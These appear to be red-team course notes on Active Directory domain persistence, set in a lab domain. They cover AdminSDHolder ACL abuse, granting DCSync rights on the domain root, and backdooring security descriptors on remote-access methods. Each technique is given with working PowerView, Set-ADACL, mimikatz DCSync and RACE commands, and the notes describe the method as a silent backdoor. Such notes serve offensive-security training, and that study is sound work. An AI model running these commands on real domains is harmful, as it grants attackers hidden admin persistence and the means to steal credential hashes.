### Domain Persistence using ACLs - AdminSDHolder
- It is ACL that makes domain admins powerful.
- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
- **Security Descriptor Propagator (SDROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder. Any differences are overwritten on the object's ACL.** So We change AdminSDHolder ACLs.
- Well known abuse of some of the Protected Groups: All of the below can log on locally to DC.
    - Account Operators: Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
    - Backup Operators: Backup GPO, edit to add SID of controlled account to a privileged group and restore.
    - Server Operator: Run a command as system.
    - Print Operator: Copy ntds.dit backup, load device drivers.
- `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <your_username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose`: Add FullControl permissions for a user to the AdminSDHolder using PowerView as Domain Admin.
- `Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose` : run SDPropagator manually.
- `Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`: Abusing FullControl using PowerView.

- AdminSDHolder is a special container resides in the System container of a domain.
- AdminSDHolder used to control the permisions for certain built-in privileged groups called Protected Groups.
- Admin Security Descriptor Holder.
- Security Descriptor Propagator runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder.
- Any differences are overwritten on the object ACL.
- Per hour, SDPROP process executes by Domain Controller.
- Protected Groups:
    - Account Operators
    - Backup Operators
    - Server Operators
    - Print Operators
    - Domain Admins
    - Enterprise Admins
    - Domain Controllers
    - Administrators
- Well-known abuse techniques for some Protected Groups:
    - Account Operators: Can modify nested group within these groups.
    - Backup Operators: Backup GPOs, edit to add SID of controlled account to a privileged group and restore.
    - Server Operators: Run a command as SYSTEM.
    - Print Operators: Copy NTDS.dit file, load device drivers.
- **Because these groups have high-privileges, SDProp process runs every hour and checks all ACLs of these group objects, and restore groups ACLs to original one by checking AdminSDHolder object ACL.**
- SDProp uses AdminSDHolder ACL to compare the protected groups ACL and overwrite if there is any changes.
- **If we add FullControl permission to a user for AdminSDHolder object, the user will have FullPermission on all protected groups once SDProp executed. After that, the user can add itself to Domain Admins group because it has permission to change domain admins object.**
* Adding FullControl permission for student1 user object to AdminSDHolder object. `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=SYSTEM,DC=dollarcorp,DC=local' -Principal student1 -Verbose` `Add-ADGroupMember -Identity "Domain Admins" -Members student1`
### Domain Persistence using ACLs - Rights Abuse
- **The ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run DCSync.**
- With DA Privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run DCSync.
- Adding "Replicating Directory Changes" to our persistence user to run DCSync attack will be our point.
* `Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=local' -Principal student1 -Verbose` -> Adding FullControl for student1 user object to domain object.
* `Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose` -> Adding DCSync execution rights for student1 user to domain object.
* `"lsadump::dcsync"` -> Execute DCSync attack on student1 powershell session.
### Domain Persistence using ACLs - Security Descriptors
- It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
- Administrative privileges are required for the target machine.
- **This attack allows non-admin users to connect other machines with remote access methods.**
- Security Descriptor Definition Language defines the format which is used to describe a security descriptor.
- SDDL uses ACE strings for DACL and SACL. `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
- - It's possible to modify Security Descriptors of multiple remote access methods to allow access to non-admin users.
- Administrative privileges are required to do this.
- **It will be our backdoor.**
- Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL. `ace_type;ace_flag;rights;object_guid;inherit_object_guid;account_sid`
- **It is very silent.**
- RACE toolkit: `Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Verbose` : Execute as domain admin and student1 user will have access to dcorp-dc. And you do not need any administrative privileges after that to access dcorp-dc.

